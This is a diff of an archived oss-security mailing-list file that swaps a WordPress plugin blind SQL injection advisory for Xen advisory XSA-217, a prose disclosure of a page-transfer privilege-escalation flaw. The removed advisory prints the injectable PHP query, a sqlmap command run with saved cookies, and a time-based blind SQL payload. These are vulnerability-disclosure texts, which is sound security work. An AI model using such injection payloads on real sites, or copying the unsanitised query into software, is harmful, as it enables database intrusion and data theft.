@@ -1,54 +1,126 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/07/11/12
-Message-id: <4E8FC4EB-4CE5-4AC4-A9E0-B304BC6B9683@me.com>
-Date: Tue, 11 Jul 2017 16:10:45 -0400
-From: "Larry W. Cashdollar" <larry0@...com>
-To: Open Source Security <oss-security@...ts.openwall.com>
-Subject: Blind SQL injection in wordpress plugin event-espresso-free v3.1.37.11.L, fixed in v3.1.37.12.L
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/06/20/5
+Message-Id: <E1dNHpG-00060f-KG@xenbits.xenproject.org>
+Date: Tue, 20 Jun 2017 12:00:06 +0000
+From: Xen.org security team <security@....org>
+To: xen-announce@...ts.xen.org, xen-devel@...ts.xen.org, xen-users@...ts.xen.org, oss-security@...ts.openwall.com
+CC: Xen.org security team <security-team-members@....org>
+Subject: Xen Security Advisory 217 - page transfer may allow PV guest to elevate privilege
 Content-Type: text/plain; charset=utf-8
 
-Title: Blind SQL injection in wordpress plugin event-espresso-free v3.1.37.11.L
-Author: Larry W. Cashdollar, @_larry0
-Date: 2017-07-04
-CVE-ID:[CVE-2017-1002026]
-Download Site: https://wordpress.org/plugins/event-espresso-free/
-Vendor: https://eventespresso.com/
-Vendor Notified: 2017-07-07, fixed v3.1.37.12.L
-Vendor Contact: plugins@...dpress.org
-Advisory: http://www.vapidlabs.com/advisory.php?v=197
-Description: Event Espresso Lite – Event Management and Registration System
-Vulnerability:
-The function  edit_event_category does not sanitize user-supplied input via the $id parameter before passing it into an SQL statement.  This allows a blind SQL attack by an authenticated user who can edit the event categories.
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA256
 
+                    Xen Security Advisory XSA-217
+                              version 2
 
-2-function edit_event_category(){
-3-	global $wpdb;
-4-	
-5:	$id=$_REQUEST['id'];
-6-	$results = $wpdb->get_results("SELECT * FROM ". EVENTS_CATEGORY_TABLE ." WHERE id =".$id);
-7-	foreach ($results as $result){
-8-		$category_id = $result->id;
-9-		$category_name = stripslashes($result->category_name);
-10-		$category_identifier = stripslashes($result->category_identifier);
+         page transfer may allow PV guest to elevate privilege
 
-Export: JSON TEXT XML
-Exploit Code:
-	• $ sqlmap -u 'http://example.com/wordpress/wp-admin/admin.php?page=event_categories&action=edit&id=*' --load-cookies=./cookie.txt --level=2 --risk=2 --dbms=mysql
-	•  
-	•  
-	• URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
-	• sqlmap identified the following injection point(s) with a total of 364 HTTP(s) requests:
-	• ---
-	• Parameter: #1* (URI)
-	•     Type: AND/OR time-based blind
-	•     Title: MySQL >= 5.0.12 time-based blind - Parameter replace
-	•     Payload: http://example.com:80/wordpress/wp-admin/admin.php?page=event_categories&action=edit&id=(CASE WHEN (6856=6856) THEN SLEEP(5) ELSE 6856 END)
-	• ---
-	• [14:53:44] [INFO] the back-end DBMS is MySQL
-	• web server operating system: Linux Ubuntu 16.04 (xenial)
-	• web application technology: Apache 2.4.18
-	• back-end DBMS: MySQL >= 5.0.12
-	• [14:53:44] [INFO] fetched data logged to text files under '/home/larry/.sqlmap/output/example.com'
-	•  
-	• [*] shutting down at 14:53:44
-	•  
+UPDATES IN VERSION 2
+====================
+
+Public release.
+
+ISSUE DESCRIPTION
+=================
+
+Domains controlling other domains are permitted to map pages owned by
+the domain being controlled.  If the controlling domain unmaps such a
+page without flushing the TLB, and if soon after the domain being
+controlled transfers this page to another PV domain (via
+GNTTABOP_transfer or, indirectly, XENMEM_exchange), and that third
+domain uses the page as a page table, the controlling domain will have
+write access to a live page table until the applicable TLB entry is
+flushed or evicted.  Note that the domain being controlled is
+necessarily HVM, while the controlling domain is PV.
+
+IMPACT
+======
+
+A malicious pair of guests may be able to access all of system memory,
+allowing for all of privilege escalation, host crashes, and
+information leaks.
+
+VULNERABLE SYSTEMS
+==================
+
+All Xen versions are vulnerable.
+
+Only x86 systems are affected.  ARM systems are not vulnerable.
+
+Only systems where an attacker can control both a PV and an HVM guest
+are vulnerable.  This must be presumed to include systems containing
+HVM domains with service domains such as stub domain device models.
+
+Systems containing only PV guests are not vulnerable.
+
+Systems containing only HVM domains serviced by dom0 device model
+processes are not vulnerable.  Note that with libxl, xl, and libvirt,
+HVM domains use dom0 device model processes by default.
+
+MITIGATION
+==========
+
+There is no mitigation for this vulnerability.
+
+Switching from stub device models to dom0 process device models is not
+recommended as a mitigation, as in practice the vulnerability is
+likely to be hard to exploit through this route; whereas dom0 process
+device models may have unknown vulnerabilities.
+
+CREDITS
+=======
+
+This issue was discovered by Jann Horn of Google Project Zero.
+
+RESOLUTION
+==========
+
+Applying the appropriate attached patch resolves this issue.
+
+xsa217.patch           xen-unstable, Xen 4.8.x, Xen 4.7.x, Xen 4.6.x
+xsa217-4.5.patch       Xen 4.5.x
+
+$ sha256sum xsa217*
+3e896412389d8e59e417ea7bb3d5b47a20de27b8eae0420c98071ce4b17d219c  xsa217.patch
+4e555cf47faf5e8d2bba4ff8a31fbe72fb11a6c0e3b286f23b26e684a1809705  xsa217-4.5.patch
+$
+
+DEPLOYMENT DURING EMBARGO
+=========================
+
+Deployment of the patches and/or mitigations described above (or
+others which are substantially similar) is permitted during the
+embargo, even on public-facing systems with untrusted guest users and
+administrators.
+
+But: Distribution of updated software is prohibited (except to other
+members of the predisclosure list).
+
+Predisclosure list members who wish to deploy significantly different
+patches and/or mitigations, please contact the Xen Project Security
+Team.
+
+(Note: this during-embargo deployment notice is retained in
+post-embargo publicly released Xen Project advisories, even though it
+is then no longer applicable.  This is to enable the community to have
+oversight of the Xen Project Security Team's decisionmaking.)
+
+For more information about permissible uses of embargoed information,
+consult the Xen Project community's agreed Security Policy:
+  http://www.xenproject.org/security-policy.html
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1
+
+iQEbBAEBCAAGBQJZSQ3LAAoJEIP+FMlX6CvZe2MH90dkMpagV2W3Q0uzwo3GT4tv
+VmrsM5O5oSCvJBpgRk397Nr6jbPfUOdH8LqHSuNjoU4vYThNqM8mTT0mqW0MKniK
+didfWFyXIjHuBIBaye2r+mFWQ5AFH9B4vp3XT65k+vgq6GTIlRmV8H/bGdeCE4kT
+6ht+ZLzc9XAvOy46pxAw0nz51QkknX4DXC0JTJW77aqKFz3H9+LKS015MLPxBvwj
+JFgmGIgLHR9lsMIGHScLLFibzTE1cDGF9u0I2DLHpWsDMaZN6kJfq8xblEtq58EE
+goth3SydPXPq4UuLfRMQMHX+pCxCdh9bwz82qThSmMFY7h/kPbw340D9+bBZIw==
+=/qch
+-----END PGP SIGNATURE-----
+
+Download attachment "xsa217.patch" of type "application/octet-stream" (1384 bytes)
+
+Download attachment "xsa217-4.5.patch" of type "application/octet-stream" (1356 bytes)
